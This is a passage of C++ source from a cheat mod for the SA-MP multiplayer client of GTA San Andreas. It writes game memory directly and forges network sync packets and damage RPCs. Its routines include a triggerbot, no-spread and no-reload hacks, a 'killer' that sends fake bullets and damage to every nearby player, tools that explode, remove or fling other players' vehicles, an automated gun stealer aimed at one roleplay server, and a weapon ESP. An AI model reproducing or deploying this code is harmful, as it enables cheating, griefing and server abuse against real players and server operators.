	bsInCarData.Write((PCHAR)&InCarData, sizeof(stInCarData));

	g_RakClient->Send(&bsInCarData, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);
}

void DisableFlyingBirds() // Disables the flying cunts
{
	*(BYTE*)0x712330 = 195;
}

void EnableFlyingBirds() // Enables the flying cunts
{
	*(BYTE*)0x712330 = 161;
}

bool aimKeyDown()
{
	bool keyDown = false;
	CControllerConfigManager* pPadConfig = pGameInterface->GetControllerConfigManager();

	if (pPadConfig->GetInputType())
	{
		// mouse + keyboard
		if (KEY_DOWN(GTAfunc_gtaKeyToVirtualKey(pPadConfig->GetControllerKeyAssociatedWithAction(AIM_WEAPON, MOUSE))))
			keyDown = true;
		else if (KEY_DOWN(GTAfunc_gtaKeyToVirtualKey(pPadConfig->GetControllerKeyAssociatedWithAction(AIM_WEAPON, KEYBOARD))))
			keyDown = true;

		if (KEY_DOWN(GTAfunc_gtaKeyToVirtualKey(pPadConfig->GetControllerKeyAssociatedWithAction(AIM_WEAPON, MOUSE))))
			keyDown = true;
		else if (KEY_DOWN(GTAfunc_gtaKeyToVirtualKey(pPadConfig->GetControllerKeyAssociatedWithAction(AIM_WEAPON, KEYBOARD))))
			keyDown = true;
	}
	else
	{
		if (KEY_DOWN(GTAfunc_gtaKeyToVirtualKey(pPadConfig->GetControllerKeyAssociatedWithAction(AIM_WEAPON, JOYSTICK))))
			keyDown = true;

		if (KEY_DOWN(GTAfunc_gtaKeyToVirtualKey(pPadConfig->GetControllerKeyAssociatedWithAction(AIM_WEAPON, JOYSTICK))))
			keyDown = true;
	}
	return keyDown;
}

void cheat_handle_triggerbot()
{
	traceLastFunc("cheat_handle_triggerbot()");

	if (g_dwSAMP_Addr == NULL || g_SAMP == NULL)
		return;

	if (!pGameInterface)
		return;

	if (isBadPtr_GTA_pPed(pPedSelf))
		return;

	if (!g_Players || !g_Players->pLocalPlayer || g_Players->pLocalPlayer->byteCurrentWeapon == NULL)
		return;

	static unsigned int delayy = GetTickCount();
	if (GetTickCount() - delayy >= 50 && set.triggerbot) {
		static bool aimming = false;
		int addr1 = *(int*)0xB6F3B8;

		addr1 += 0x79C;
		int addr2 = *(int*)addr1;

		if (addr2) 
		{
			if (!aimming)
			{
				INPUT    Input = { 0 };
				Input.type = INPUT_MOUSE;
				Input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
				SendInput(1, &Input, sizeof(INPUT));
				aimming = true;
			}
			addr1 = *(int*)0xB6F3B8;
			addr1 += 0x79C;
			*(int*)addr1 = 0;

		}
		else
		{
			if (aimming) {
				INPUT    Input = { 0 };
				Input.type = INPUT_MOUSE;
				Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
				SendInput(1, &Input, sizeof(INPUT));
				aimming = false;
			}
		}
	}
}

void cheat_handle_nospread()
{
	traceLastFunc("cheat_handle_nospread()");

	if (set.nospread_trigger == 0 && !set.nospread_go) set.nospread_go = true;

	if (set.nospread)
	{
		if (set.nospread_go)
		{
			*(FLOAT*)0xB7CDC8 = 0.0f;
		}
	}
}

void cheat_handle_noreload()
{
	traceLastFunc("cheat_handle_noreload()");
	if (set.noreload)
	{
		eWeaponSlot selfSlot = pPedSelf->GetCurrentWeaponSlot();
		CWeapon *cWep = pPedSelf->GetWeapon(selfSlot);
		if (cWep->GetState() == WEAPONSTATE_RELOADING)
		{
			cWep->SetState(WEAPONSTATE_READY);
		}
	}
}

void cheat_handle_dualshot()
{
	traceLastFunc("cheat_handle_dualshot()");
	if (set.dShotStatus)
	{
		if (set.dShotLTick != -1 && (GetTickCount() - set.dShotDelay) > set.dShotLTick)
		{
			if (set.dShotReady)
			{
				BitStream dsBS;
				dsBS.ResetWritePointer();
				dsBS.Write((BYTE)ID_BULLET_SYNC);
				dsBS.Write((PCHAR)&dShotBulletData, sizeof(stBulletData));
				g_RakClient->Send(&dsBS, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);
				set.dShotReady = 0;
			}
		}
	}
}

void cheat_handle_autounscrambler()
{
	traceLastFunc("cheat_handle_autounscrambler()");
	if (!wordListLoaded)
	{
		wordListLoaded = true;
		wordList.clear();
		std::ifstream dictionary(M0D_FOLDER"wordlist.txt");
		if (!dictionary.is_open())
		{
			std::ofstream dictFileEx(M0D_FOLDER"wordlist.txt");
			if (dictFileEx.is_open())
			{
				dictFileEx << "[dont_remove_this]";
			}
			dictFileEx.close();
			wordListLoaded = false;
		}
		else
		{
			std::string temp;
			while (!dictionary.eof())
			{
				dictionary >> temp;
				wordList.push_back(temp);
			}
		}
		dictionary.close();
	}

	if (_UnsWork && (_UnsNewTick == -1 || GetTickCount() > _UnsNewTick))
	{
		char cmdEx[92] = { 0 };
		sprintf(cmdEx, "/uns %s", _UnsSolved.c_str());

		say(cmdEx);

		_UnsWork = false;
		_UnsNewTick = -1;
		_UnsSolved = "";

	}
	if (set.autounscramble)
	{

		if (_UnsWork == false)
		{
			for (int i = 0; i < 255; i++)
			{
				if (g_SAMP->pPools->pTextdraw->playerTextdraw[i]->szText == nullptr || 
					strlen(g_SAMP->pPools->pTextdraw->playerTextdraw[i]->szText) < 3) continue;

				char* findPos = strstr(g_SAMP->pPools->pTextdraw->playerTextdraw[i]->szText, " to unscramble the word.~n~\"~w~");

				if (findPos != NULL)
				{
					std::string extracted = extractfromstr(g_SAMP->pPools->pTextdraw->playerTextdraw[i]->szText, "\"~w~", "~r~\"");

					if (extracted.length() > 2 && _UnsLastWord.compare(extracted) != 0)
					{

						std::string word = extracted;
						_UnsLastWord = word;
						bool foundIt = false;
						int countInz = 0;
						for (unsigned int i = 0; i < wordList.size(); i++)
						{
							if (foundIt == true) break;
							countInz = 0;
							std::sort(word.begin(), word.end());
							do
							{
								if (word.compare(extracted) == 0)
								{
									countInz++;
									if (wordList[i].compare(word) == 0)
									{
										foundIt = true;
										break;
									}
									if (countInz > 5) break;
								}
								if (wordList[i].compare(word) == 0)
								{
									foundIt = true;
									break;
								}

							} while (next_permutation(word.begin(), word.end()));
						}
						if (foundIt == true)
						{

							cheat_state_text("Unscrambled Word: %s\n", word.c_str());
							_UnsSolved = word;
							_UnsNewTick = GetTickCount() + set.autounscramble_delay;
							_UnsWork = true;
						}
					}
				}
			}
		}
	}
}

void cheat_handle_explodecars()
{
	traceLastFunc("cheat_handle_explodecars()");

	if (set.explodecars == 1 && !set.noBigHacks)
	{
		struct actor_info	*self = actor_info_get(ACTOR_SELF, 0);

		static int v = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy(&vinfo->base.matrix[4 * 3], fPos);

		float fSpeed[3];
		fSpeed[0] = vinfo->speed[0];
		fSpeed[1] = vinfo->speed[1];
		fSpeed[2] = vinfo->speed[2];

		stInCarData vehSync;
		memset(&vehSync, 0, sizeof(stInCarData));

		vehSync.sVehicleID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];
		vehSync.fVehicleHealth = 1.0;
		vehSync.fMoveSpeed[0] = fSpeed[0];
		vehSync.fMoveSpeed[1] = fSpeed[1];
		vehSync.fMoveSpeed[2] = fSpeed[2];
		vehSync.sKeys = 0;
		vehSync.bytePlayerHealth = self->hitpoints;
		vehSync.byteArmor = self->armor;

		SendFakeDriverFullSyncData(&vehSync, 0);

		cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());

		vinfo->hitpoints = vehSync.fVehicleHealth;

		v++;

	find_another_car:
		for (v; v < MAX_VEHICLES; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= MAX_VEHICLES)
			v = 0;
	}
}

void cheat_handle_carsfloating()
{
	traceLastFunc("cheat_handle_carsfloating()");

	if (set.carsfloating == 1 && !set.noBigHacks)
	{
		struct actor_info	*self = actor_info_get(ACTOR_SELF, 0);

		static int v = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy(&self->base.matrix[4 * 3], fPos);

		fPos[0] += -15 + rand() % 30;
		fPos[1] += -15 + rand() % 30;
		fPos[2] += 20.0f;

		float fSpeed[3] = { 0.0f, 0.0f, 0.3f };

		stInCarData vehSync;
		memset(&vehSync, 0, sizeof(stInCarData));

		vehSync.sVehicleID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];
		vehSync.fVehicleHealth = vinfo->hitpoints;
		vehSync.fMoveSpeed[0] = fSpeed[0];
		vehSync.fMoveSpeed[1] = fSpeed[1];
		vehSync.fMoveSpeed[2] = fSpeed[2];
		vehSync.sKeys = 0;
		vehSync.bytePlayerHealth = self->hitpoints;
		vehSync.byteArmor = self->armor;

		SendFakeDriverFullSyncData(&vehSync, 0);

		cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());

		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];
		vinfo->speed[2] = fSpeed[2];

		v++;

	find_another_car:
		for (v; v < MAX_VEHICLES; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= MAX_VEHICLES)
			v = 0;
	}
}

void cheat_handle_removecars()
{
	traceLastFunc("cheat_handle_removecars()");

	if (set.removecars == 1 && !set.noBigHacks)
	{
		struct actor_info	*self = actor_info_get(ACTOR_SELF, 0);

		static int v = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy(&self->base.matrix[4 * 3], fPos);

		fPos[0] = 1088.5;
		fPos[1] = -2852.38;
		fPos[2] = -7.00;
		
		float fSpeed[3] = { 0.0f, 0.0f, 0.3f };

		stInCarData vehSync;
		memset(&vehSync, 0, sizeof(stInCarData));

		vehSync.sVehicleID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];
		vehSync.fVehicleHealth = vinfo->hitpoints;
		vehSync.fMoveSpeed[0] = fSpeed[0];
		vehSync.fMoveSpeed[1] = fSpeed[1];
		vehSync.fMoveSpeed[2] = fSpeed[2];
		vehSync.sKeys = 0;
		vehSync.bytePlayerHealth = self->hitpoints;
		vehSync.byteArmor = self->armor;

		SendFakeDriverFullSyncData(&vehSync, 0);

		cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());

		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];
		vinfo->speed[2] = fSpeed[2];

		v++;

	find_another_car:
		for (v; v < MAX_VEHICLES; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= MAX_VEHICLES)
			v = 0;
	}
}

void cheat_handle_carshooter()
{
	traceLastFunc("cheat_handle_carshooter()");

	static int once = 1;
	static int carUsed[MAX_VEHICLES];

	if (set.carshooter == 1 && !set.noBigHacks)
	{
		struct actor_info	*self = actor_info_get(ACTOR_SELF, 0);

		static int v = 0;
		static int x = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		if (KEY_DOWN(VK_LBUTTON))
		{
			float fPos[3];
			vect3_copy(&self->base.matrix[4 * 3], fPos);

			fPos[0] += cam_matrix[4] * (6.0f + x);
			fPos[1] += cam_matrix[5] * (6.0f + x);
			fPos[2] += cam_matrix[6] * (2.0f + x);

			float fSpeed[3];
			fSpeed[0] = cam_matrix[4] * 7.5f;
			fSpeed[1] = cam_matrix[5] * 7.5f;
			fSpeed[2] = cam_matrix[6] * 7.5f;

			stInCarData vehSync;
			memset(&vehSync, 0, sizeof(stInCarData));

			vehSync.sVehicleID = iSAMPVehicleID;
			vehSync.fPosition[0] = fPos[0];
			vehSync.fPosition[1] = fPos[1];
			vehSync.fPosition[2] = fPos[2];
			vehSync.fVehicleHealth = vinfo->hitpoints;
			vehSync.fMoveSpeed[0] = fSpeed[0];
			vehSync.fMoveSpeed[1] = fSpeed[1];
			vehSync.fMoveSpeed[2] = fSpeed[2];
			vehSync.sKeys = 0;
			vehSync.bytePlayerHealth = self->hitpoints;
			vehSync.byteArmor = self->armor;

			SendFakeDriverFullSyncData(&vehSync, 0);
			cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
			vinfo->speed[0] = fSpeed[0];
			vinfo->speed[1] = fSpeed[1];
			vinfo->speed[2] = fSpeed[2];

			x--;
			if (x < -1) x = 0;

			v++;
		}

	find_another_car:
		for (v; v < MAX_VEHICLES; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= MAX_VEHICLES)
			v = 0;
	}
}

void cheat_handle_killer_weapon()
{
	traceLastFunc("cheat_handle_killer_weapon()");
	if (set.killer_enabled && !set.atbmenu_enabled)
	{
		if (GetTickCount() >= set.killer_counter_tick && set.killer_counter_players > 0)
		{
			addMessageToChatWindow(" ");
			addMessageToChatWindow("{FF6347}[{FFFFFF}Killer Statistics{FF6347}]");
			addMessageToChatWindow("{FF6347}[Players Attacked] {FFFFFF}[%d]", set.killer_counter_players);
			addMessageToChatWindow("{FF6347}[Times Attacked] {FFFFFF}[%d]", set.killer_counter_bullets);
			addMessageToChatWindow("{FF6347}[Statistics Time] {FFFFFF}[%ds]", set.killer_counter_updatetime);
			addMessageToChatWindow(" ");



			set.killer_counter_players = 0;
			set.killer_counter_bullets = 0;
			set.killer_counter_tick = GetTickCount() + (1000 * set.killer_counter_updatetime);
		}
		while (set.killer_cur >= SAMP_MAX_PLAYERS || !ValidPlayer(set.killer_cur) || !IsPlayerStreamed(set.killer_cur) ||
			(set.killer_friendFilter && Friends.size() > 0 && std::find(Friends.begin(), Friends.end(), getPlayerName(set.killer_cur)) != Friends.end()))
		{
			set.killer_cur++;
			if (set.killer_cur >= SAMP_MAX_PLAYERS)
			{
				set.killer_cur = 0;
				set.killer_lastTick = GetTickCount() + 10;
				return; // Need this here so we don't get stuck on infinite loop when there are no streamed players.
			}
		}

		if (GetTickCount() >= set.killer_lastTick || set.killer_lastTick == -1)
		{
			BitStream bDataBS;
			stBulletData BulletData;

			BulletData.byteType = 1;
			BulletData.byteWeaponID = g_Players->pLocalPlayer->byteCurrentWeapon;
			BulletData.sTargetID = set.killer_cur;

			float pPos[3];
			getPlayerPos(set.killer_cur, BulletData.fOrigin);

			vect3_copy(pPos,
				BulletData.fTarget);

			BulletData.fCenter[0] = 0;
			BulletData.fCenter[1] = 0;

			if (g_Players->pRemotePlayer[set.killer_cur]->pPlayerData->bytePlayerState == PLAYER_STATE_ONFOOT)
			{
				BulletData.fCenter[2] = 0;
			}
			else
			{
				BulletData.fCenter[2] = 0.56 - ((rand() % 5) / 100.0f);
			}

			BitStream bsGiveDamage;
			bsGiveDamage.Write(false);
			bsGiveDamage.Write((UINT16)set.killer_cur);
			bsGiveDamage.Write(fWeaponDamage[g_Players->pLocalPlayer->byteCurrentWeapon]);
			bsGiveDamage.Write((UINT32)g_Players->pLocalPlayer->byteCurrentWeapon);

			if (set.fakeheadshot)
			{
				bsGiveDamage.Write((UINT32)9);
			}
			else
			{
				bsGiveDamage.Write((UINT32)srandom<UINT32>(3, 9));
			}

			bDataBS.Write((BYTE)ID_BULLET_SYNC);
			bDataBS.Write((PCHAR)& BulletData, sizeof(stBulletData));

			cheat_state_text("Attacking: %s [%d]", getPlayerName(set.killer_cur), set.killer_cur);

			for (int i = 0; i < set.killer_bullets; i++)
			{
				g_RakClient->Send(&bDataBS, HIGH_PRIORITY, UNRELIABLE_SEQUENCED);

				g_RakClient->RPC(RPC_GiveTakeDamage, &bsGiveDamage);
				set.killer_counter_bullets++;
			}

			//addMessageToChatWindow("{FFFFFF}Attacking: {00FF33}%s {FF0000}[%d]", getPlayerName(set.killer_cur), set.killer_cur);

			set.killer_lastTick = GetTickCount() + set.killer_delay;
			set.killer_cur++;
			set.killer_counter_players++;
		}
	}
	else if (set.atbmenu_enabled && set.killer_enabled)
	{
		cheat_state_text("-> Killer Info: [Disable MENU to Kill]");
	}
	return;
}

void cheat_handle_lsrp_gunstealer()
{
	traceLastFunc("cheat_handle_lsrp_gunstealer()");

	if (lsrpStealGuns_Working)
	{
		HookedRakClientInterface* intfc = (HookedRakClientInterface*)g_SAMP->pRakClientInterface;

		if (lsrpStealGuns_ForceAdjust == true)
		{
			switch (lsrpStealGuns_Stage)
			{
			case 0:
				if (lsrpStealGuns_ForceAdjust_Waiting == false && (lsrpStealGuns_LastAction + intfc->GetLastPing() + 50) < GetTickCount())
				{
					say("/adjustgun 1");

					lsrpStealGuns_ForceAdjust_Waiting = true;
					lsrpStealGuns_LastAction = GetTickCount(); // Need dead-on timing so locking without any /CAREFUL/ unneeded delay.
					// Stage goes automatically as weapon adjuster comes on.
				}
				else if (GetTickCount() - (intfc->GetLastPing() + 50) > lsrpStealGuns_LastAction && lsrpStealGuns_ForceAdjust_Waiting == true) 
					// Weapon adjustion never came? wtf...
				{
					// must mean no gun to actually adjust so just move on...
					lsrpStealGuns_ForceAdjust_Waiting = false;
					lsrpStealGuns_Stage++; // go to gun2
					lsrpStealGuns_LastAction = GetTickCount();

					addMessageToChatWindow("{FFFFFF}Gun Stealer -> {FF0000}Weapon 1 adjust timeout, moving to 2...");
				}
				break;

			case 1:
				say("/taw");

				if (lsrpStealGuns_ForceAdjust_Waiting == false)
				{
					say("/takegun 1");
					say("/adjustgun 2");

					lsrpStealGuns_ForceAdjust_Waiting = true;
					lsrpStealGuns_LastAction = GetTickCount(); // Need dead-on timing so locking without any /CAREFUL/ unneeded delay.
					// Stage goes automatically as weapon adjuster comes on.
				}
				else if (GetTickCount() - (intfc->GetLastPing() + 50) > lsrpStealGuns_LastAction && lsrpStealGuns_ForceAdjust_Waiting == true)
					// Weapon adjustion never came? wtf...
				{
					say("/takegun 1");
					// must mean no gun to actually adjust so just move on...
					lsrpStealGuns_ForceAdjust_Waiting = false;
					lsrpStealGuns_Stage++; // go to gun3
					lsrpStealGuns_LastAction = GetTickCount();

					addMessageToChatWindow("{FFFFFF}Gun Stealer -> {FF0000}Weapon 2 adjust timeout, moving to 3...");
				}
				break;

			case 2:
				say("/tad");

				if (lsrpStealGuns_ForceAdjust_Waiting == false)
				{
					say("/takegun 2");
					say("/adjustgun 3");

					lsrpStealGuns_ForceAdjust_Waiting = true;
					lsrpStealGuns_LastAction = GetTickCount(); // Need dead-on timing so locking without any /CAREFUL/ unneeded delay.
					// Stage goes automatically as weapon adjuster comes on.
				}
				else if (GetTickCount() - (intfc->GetLastPing() + 50) > lsrpStealGuns_LastAction && lsrpStealGuns_ForceAdjust_Waiting == true)
					// Weapon adjustion never came? wtf...
				{
					say("/takegun 2");
					// must mean no gun to actually adjust so just move on...
					lsrpStealGuns_ForceAdjust_Waiting = false;
					lsrpStealGuns_Stage++; // go to gun4
					lsrpStealGuns_LastAction = GetTickCount();

					addMessageToChatWindow("{FFFFFF}Gun Stealer -> {FF0000}Weapon 3 adjust timeout, moving to 4...");
				}
				break;

			case 3:
				if (lsrpStealGuns_ForceAdjust_Waiting == false)
				{
					say("/takegun 3");
					say("/adjustgun 4");

					lsrpStealGuns_ForceAdjust_Waiting = true;
					lsrpStealGuns_LastAction = GetTickCount(); // Need dead-on timing so locking without any /CAREFUL/ unneeded delay.
					// Stage goes automatically as weapon adjuster comes on.
				}
				else if (GetTickCount() - (intfc->GetLastPing() + 50) > lsrpStealGuns_LastAction && lsrpStealGuns_ForceAdjust_Waiting == true)
					// Weapon adjustion never came? wtf...
				{
					say("/takegun 3");
					// must mean no gun to actually adjust so just move on...
					lsrpStealGuns_ForceAdjust_Waiting = false;
					lsrpStealGuns_Stage++; // go to retrieval of guns
					lsrpStealGuns_LastAction = GetTickCount();

					addMessageToChatWindow("{FFFFFF}Gun Stealer -> {00CCFF}Weapon 4 adjust timeout, moving to retrieval of whatever is available...");
				}
				break;

			case 4:
				if (lsrpStealGuns_LastAction < GetTickCount())
				{
					say("/takegun 4");

					lsrpStealGuns_LastAction = GetTickCount() + 100;
					lsrpStealGuns_Stage++;
				}
				break;

			case 5:
				if ((lsrpStealGuns_LastAction + intfc->GetLastPing() + 50) < GetTickCount())
				{
					BitStream bsExitVeh;
					bsExitVeh.Write(lsrpStealGuns_VID);
					g_RakClient->RPC(RPC_ExitVehicle, &bsExitVeh);

					lsrpStealGuns_Working = false;
					lsrpStealGuns_ForceAdjust_Waiting = false;
					lsrpStealGuns_ForceAdjust = false;
					lsrpStealGuns_LastAction = GetTickCount();

					addMessageToChatWindow("{FFFFFF}Gun Stealer -> {00FF33}Steal attempt completed with force adjust.");
					addMessageToChatWindow("{FFFFFF}Gun Stealer -> {FFFF00}If you failed because 'not close enough', use cmd without parameters for help.");

					if (lsrpStealGuns_RespawnAfter) {
						pPedSelf->SetHealth(0.0);
						g_RakClient->SendSpawn();
					}
				}
				break;
			}
		}
		else {
			switch (lsrpStealGuns_Stage)
			{
			case 0:
				if ((lsrpStealGuns_LastAction + intfc->GetLastPing() + 50) < GetTickCount())
				{
					say("/takegun 1");
					say("/takegun 2");
					say("/takegun 3");
					say("/takegun 4");

					say("/tad");
					say("/taw");

					lsrpStealGuns_LastAction = GetTickCount() + 100;
					lsrpStealGuns_Stage++;
				}
				break;

			case 1:
				if ((lsrpStealGuns_LastAction + intfc->GetLastPing() + 50) < GetTickCount())
				{
					BitStream bsExitVeh;
					bsExitVeh.Write(lsrpStealGuns_VID);
					g_RakClient->RPC(RPC_ExitVehicle, &bsExitVeh);

					lsrpStealGuns_Working = false;
					lsrpStealGuns_LastAction = GetTickCount();

					addMessageToChatWindow("{FFFFFF}Gun Stealer -> {00FF33}Steal attempt completed.");

					if (lsrpStealGuns_RespawnAfter) {
						pPedSelf->SetHealth(0.0);
						g_RakClient->SendSpawn();
					}
				}
				break;
			}
		}
	}
	return;
}

void cheat_handle_unoccupiedremover()
{
	traceLastFunc("cheat_handle_unoccupiedremover()");

	static int once = 1;
	static int told = 0;
	static int carUsed[MAX_VEHICLES];

	if (set.unoccupiedremover == 1 && !set.noBigHacks)
	{
		if (told == 0)
		{
			addMessageToChatWindow("You can hold down LMOUSE to destroy the cars while removing them!");
			told = 1;
		}

		struct actor_info* self = actor_info_get(ACTOR_SELF, 0);
		BitStream bsVehicleSync;

		static int v = 0;
		static int x = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info* vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		stUnoccupiedData vehSync;

		memset(&vehSync, 0, sizeof(stUnoccupiedData));

		float fPos[3];
		vect3_copy(&self->base.matrix[4 * 3], fPos);

		fPos[0] = 1088.5;
		fPos[1] = -2852.38;
		fPos[2] = -7.00;

		float fSpeed[3] = { 0.0f, 0.0f, 0.3f };

		vehSync.sVehicleID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];

		vehSync.fHealth = vinfo->hitpoints;

		if(KEY_DOWN(VK_LBUTTON)) vehSync.fHealth = 170.0;

		vehSync.fMoveSpeed[0] = fSpeed[0];
		vehSync.fMoveSpeed[1] = fSpeed[1];
		vehSync.fMoveSpeed[2] = fSpeed[2];

		vehSync.byteSeatID = 0;
		vehSync.fRoll[0] = -1.0;
		vehSync.fRoll[1] = 0.0;
		vehSync.fRoll[2] = 1.0;
		vehSync.fTurnSpeed[0] = -1.0;
		vehSync.fTurnSpeed[1] = 0.0;
		vehSync.fTurnSpeed[2] = 1.0;

		bsVehicleSync.Write((BYTE)ID_UNOCCUPIED_SYNC);
		bsVehicleSync.Write((PCHAR)&vehSync, sizeof(stUnoccupiedData));

		g_RakClient->Send(&bsVehicleSync);

		cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
		vinfo->speed[0] = 0.0;
		vinfo->speed[1] = 0.0;
		vinfo->speed[2] = 0.0;
		vinfo->hitpoints = vehSync.fHealth;

		x--;
		if (x < -1) x = 0;

		v++;

	find_another_car:
		for (v; v < MAX_VEHICLES; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= MAX_VEHICLES)
			v = 0;
		
	}
}

void cheat_handle_explodecarssilent()
{
	traceLastFunc("cheat_handle_explodecarssilent()");

	static int once = 1;
	static int carUsed[MAX_VEHICLES];

	if (set.explodecarssilent == 1 && !set.noBigHacks)
	{
		struct actor_info* self = actor_info_get(ACTOR_SELF, 0);


		BitStream bsMsg;

		static int v = 0;
		static int x = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info* vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		bsMsg.Write(iSAMPVehicleID);

		g_RakClient->RPC(RPC_VehicleDestroyed, &bsMsg);

		vinfo->hitpoints = 230.0;


		x--;
		if (x < -1) x = 0;

		v++;

	find_another_car:
		for (v; v < MAX_VEHICLES; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= MAX_VEHICLES)
			v = 0;
	}
}

void cheat_handle_weaponfinder()
{
	traceLastFunc("cheat_handle_weaponfinder()");
	if (set.weaponFinder)
	{
		CVector pSpinePos;
		pPedSelf->GetBonePosition(BONE_HEAD, &pSpinePos);

		int count = 0;
		for (int id = 0; id < SAMP_MAX_OBJECTS; id++)
		{
			if (!g_SAMP->pPools->pObject->iIsListed[id]) continue;

			D3DXVECTOR3 poss, screenposs;
			CVector2D			screenPosition;
			
			float fPos[3], playerPos[3];

			
			vect3_copy(&g_SAMP->pPools->pObject->object[id]->pGTAEntity->base.matrix[4 * 3], fPos);
			playerPos[0] = pSpinePos.fX;
			playerPos[1] = pSpinePos.fY;
			playerPos[2] = pSpinePos.fZ;


			if (vect3_near_zero(fPos)) continue;

			char objName[256];
			sprintf_s(objName, "");

			const struct weapon_entry* weapon;
			for (weapon = weapon_list; weapon->name != NULL; weapon++)
			{
				if (weapon->model_id != -1 && weapon->model_id == g_SAMP->pPools->pObject->object[id]->iModel)
				{
					if (weapon->model_id >= 335 && weapon->model_id <= 363)
					{
						sprintf_s(objName, "%s", weapon->name);
					}
				}
			}

			if (strlen(objName) >= 2)
			{
				count++;
				poss.x = fPos[0];
				poss.y = fPos[1];
				poss.z = fPos[2];
				CalcScreenCoors(&poss, &screenposs);

				// check if the iter is culled or not
				if (screenposs.z < 1.f)
					continue;

				// D3DXVECTOR3 to CVector2D
				screenPosition.fX = screenposs.x;
				screenPosition.fY = screenposs.y;

				float fDistanceFromWeapon = vect3_dist(fPos, playerPos);

				if (fDistanceFromWeapon >= 1800.0)
				{
					count--;
					continue;
				}

				if (g_SAMP->pPools->pObject->object[id]->iModel == 336) count--; // Bat, don't add as count in weapons but still show.

				char distStr[256];
				sprintf_s(distStr, " [%0.1fm]", fDistanceFromWeapon);
				strcat(objName, distStr);
				
				pD3DFont->PrintShadow(screenPosition.fX, screenPosition.fY - (pD3DFont_sampStuff->DrawHeight() - 1),
					D3DCOLOR_RGBA(61, 237, 237, 128), objName);
			}
		}
		D3DXVECTOR3 poss, screenposs;
		poss.x = CVecToD3DXVEC(pSpinePos).x;
		poss.y = CVecToD3DXVEC(pSpinePos).y;
		poss.z = CVecToD3DXVEC(pSpinePos).z;
		CalcScreenCoors(&poss, &screenposs);

		char bufEx[256];
		sprintf_s(bufEx, "%d Weapons", count);
		pD3DFont_sampStuff->PrintShadow(screenposs.x, screenposs.y - (pD3DFont_sampStuff->DrawHeight() - 1),
			D3DCOLOR_RGBA(255, 255, 0, 128), bufEx);
	}
}

void cheat_handle_itroll_targetfinder()
{
